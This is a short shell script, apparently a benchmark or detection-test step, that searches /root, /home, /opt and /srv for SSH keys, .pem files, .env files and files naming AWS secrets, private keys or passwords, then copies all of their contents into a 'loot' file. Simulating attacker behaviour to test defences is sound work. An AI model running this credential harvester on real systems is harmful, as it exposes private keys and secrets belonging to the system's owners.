#!/bin/sh
set -u
marker="${BENCH_MARKER:-manual}"
work="/tmp/bench-$marker"

hit_list="$work/hits"
loot="$work/loot"

sh "$(dirname "$0")/cleanup.sh"
mkdir -p "$work" || exit 1

search_roots="/root /home /opt /srv"
echo "BENCH_ACTION $(date +%s.%N)"
find $search_roots -xdev -type f \( -name credentials -o -name 'id_rsa*' -o -name '*.pem' -o -name .env \) 2>/dev/null > "$hit_list"
grep -rlE 'aws_secret_access_key|PRIVATE KEY|PASSWORD' $search_roots 2>/dev/null >> "$hit_list"

files_read=0
for credential_file in $(sort -u "$hit_list"); do
    if cat "$credential_file" >> "$loot" 2>/dev/null; then
        echo "read $credential_file"
        files_read=$((files_read + 1))
    fi
done

[ "$files_read" -gt 0 ]
